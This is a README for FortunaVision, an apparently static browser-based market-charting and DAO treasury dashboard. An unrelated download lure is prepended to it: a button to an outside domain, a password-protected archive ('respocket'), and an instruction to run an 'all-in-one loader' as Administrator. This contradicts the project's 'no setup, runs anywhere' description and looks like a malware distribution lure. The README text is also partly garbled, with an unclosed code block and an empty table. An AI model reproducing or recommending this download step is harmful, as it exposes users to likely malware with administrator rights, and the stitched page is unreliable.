<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<!-- readme-standard: 2026-11-02 -->
<div align="center">

<img src="assets/banner.svg" width="100%" alt="FortunaVision: candles draw across a chart. An illustration only, never real data and never a real pair.">

# 👁️ FortunaVision — a chart-first market & treasury workstation

*A chart-first market and treasury workstation. Static, runs anywhere, no keys.*

## <img src="assets/icons/compass.svg" width="24" height="24" alt=""> TL;DR

1. <img src="assets/icons/eye.svg" width="16" height="16" alt=""> **What this is.** TradingView's open-source chart engine beside Fortuna's own SVG engine: markets on the left, instruments on the right, a command line underneath.
2. <img src="assets/icons/users-round.svg" width="16" height="16" alt=""> **Who it is for.** Anyone who wants to read one market deeply; treasury mode turns the same screen toward a DAO or non-profit treasury.
## 🚀 Run it

```sh
## 🧭 The workstation

| Region | What it does |
|---|---|
| 🧱 **Rail** (left) | every market Fortuna watches, live mid, 24h change, 1h / 4h bias, and its watchlist status (armed · watch · paused) |
| 📈 **Chart** (centre) | the hero: candles or area, volume with a visible-range profile (point of control in brass), EMA 20 / 50 / 200, and every overlay below; a drawing toolbar on its left edge |
| 🎛️ **Inspector** (right) | **Levels** · **Regime** · **Flow** · **Gamma** · **Calc** · **Desk** |
| ⌨️ **Command line** (bottom) | `gold 15m` · `btc gamma` · `es levels` · `draw fib` · `alert above 4020` · `treasury` · `help` |

### 📐 Two chart engines

TradingView's **Lightweight Charts** is the default. Fortuna's own **SVG renderer**, the one its background analysis draws with, is the second engine: it renders the same scene (candles, EMAs, Auto Levels, zones, rails, FVGs, fibs, gamma walls, prints, Bollinger, the volume profile, indicator panes) with scroll-to-zoom, drag-to-pan, axis scaling and double-click-to-fit. Switch in the header or type `svg` / `tradingview`. Drawings live on the TradingView engine.

### 🧩 What is on the chart

- **Auto Levels**: KEY (brass), 5/5 and 3/5 (cyan), ghosts (violet), each drawn from the hour it was born. The engine is `engines/autolevels.js`, a port of Christopher's TradingView indicator; the scanner runs the same code in Python.
- Zones from the watchlist, positions with stop / target / liquidation, PDH / PDL, midnight and week opens.
- Legend toggles: session rails (FCR 9:30, 4/5 opens and closes), fair value gaps, pattern marks (P · R · B · SFP · BRK/RT · 1-2-3), the fib ladder of the last impulse, ATR bands, Bollinger, **gamma walls** (call wall, put wall, flip, the largest strikes; index strikes shifted by the futures basis), **large prints** (the biggest taker prints of the last 15 minutes as dots), the **OG-style oscillator** pane.
- **Drawings**: trend, ray, extended line, horizontal line and ray, vertical line, rectangle, channel, fib retracement, measure, long / short position, text. Stored as time + price per market in the browser, so they survive a timeframe change.
- **Plans and alerts**: the Calc tab sizes a position from the stop and builds a **ladder** (entry plus up to five limits, generic DCA math: the entry is sized so the whole ladder loses exactly the risk if every leg fills and the stop hits) and draws the planned orders on the chart. `alert 4020` / `alert above 4020` sets a price alert, checked every 30 seconds against live mids, drawn on the chart, fired once as a desktop notification or a flash on the command line.

## 🏛️ Treasury mode

`treasury` (or the **Markets | Treasury** switch in the header) turns the same workstation toward a DAO or non-profit treasury:

| Tab | What it shows | Source |
|---|---|---|
| 🌍 **Markets** | total crypto market cap, 24h change, volume, TOTAL2 ex-BTC, dominance, the top 50 by cap with 24h / 7d / 30d | CoinGecko |
| ⛓️ **Rail + chart** | chains by value locked; a chain's TVL history with EMA 30 / 90 | DeFiLlama |
| 🌾 **Yields** | stablecoin pools by APY on the chain in view and across chains (loaded on demand) | DeFiLlama |
| 💵 **Stables** | USD stablecoin supply, 7d / 30d change, peg health | DeFiLlama |
| 🧺 **Holdings** | wallets by **public address** (an EVM address read on seven chains for native and blue-chip tokens, Solana, Bitcoin), plus a ledger for what is off chain; allocation by asset and by chain, priced live | public RPCs, Blockstream, CoinGecko |
| 📜 **Policy** | the organisation's written rules as a small JSON (reserve months, target weights by class, drift band, chain concentration, giving rules, agent limits) and the live drift of the holdings against them: reserve coverage in months, issuer concentration, over / under / in band per class | your policy + the holdings above |
| 🔁 **DEX arb** | the Arbitrum arbitrage lane, results only, never the method | the lane's public snapshot |
| 🗒️ **Desk** | what this mode is for, sources, commands | — |

This is the seed of the treasury terminal for the organisations whose treasuries Christopher manages: every useful chain brought into one read, market and macro data beside the holdings, so a reserve can be balanced to bless others while capitalising on what the market offers. Wallet balances by public address are in; Safe owners and queues, Fed and Treasury rates and CFTC positioning are the next adapters (the last three through a small proxy, since those sources block browsers). Addresses you paste stay in your browser.

## 📡 Every number has a source

| Source | What | Where it is used |
|---|---|---|
| Fortuna Terminal data (GitHub Pages, CORS open) | levels, watchlist, positions, check-ins, scanner read, gamma snapshot | rail, Desk, Levels, Regime, Gamma, chart overlays |
| Hyperliquid public API | candles (5m–1d), mids, order book, live trades websocket | chart, Flow, large prints, alerts |
| DeFiLlama (api / yields / stablecoins) | chains and TVL history, pools and APY, stablecoin supply | Treasury mode |
| CoinGecko | global market cap, top assets, prices for holdings | Treasury mode |
| Public JSON-RPC nodes (publicnode, the chains' own endpoints) and Blockstream | balances by public address: Ethereum, Arbitrum, Base, Optimism, Polygon, Avalanche, BNB Chain, Solana, Bitcoin | Holdings tab |
| The DEX-arb lane's public snapshot | study progress, simulated and cleared edges | DEX arb tab, Desk |

No keys, no accounts, nothing leaves the page except the requests above.

## 🗺️ Where things live

| Surface | Role |
|---|---|
## 🧭 Roadmap

Phase 1 (shipped Oct 26, 2026): the workstation shell, two chart engines, overlays, drawings, the indicator contract, Flow, Gamma, Calc with the ladder planner, Desk, Treasury mode, price alerts, the command line. Oct 27: wallets by public address, the Policy tab with drift, a mobile pass. Next: Safe adapters, the macro adapters through a proxy, bar replay and alerts on drawings (references in quant-terminal), a mobile pass, and the Fortuna Terminal's migration here after the October competition closes.


---

MIT License

Copyright (c) 2026 Christopher Wilson (drasticstatic)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Third-party parts, each under its own licence (see vendor/ and THIRD-PARTY.md):
  TradingView Lightweight Charts v5.2.1 — Apache-2.0 — vendor/lightweight-charts.LICENSE
  quant-terminal by Lewis Jackson (drawings.js, volume-profile.js, the indicator contract) — MIT — vendor/quant-terminal.LICENSE
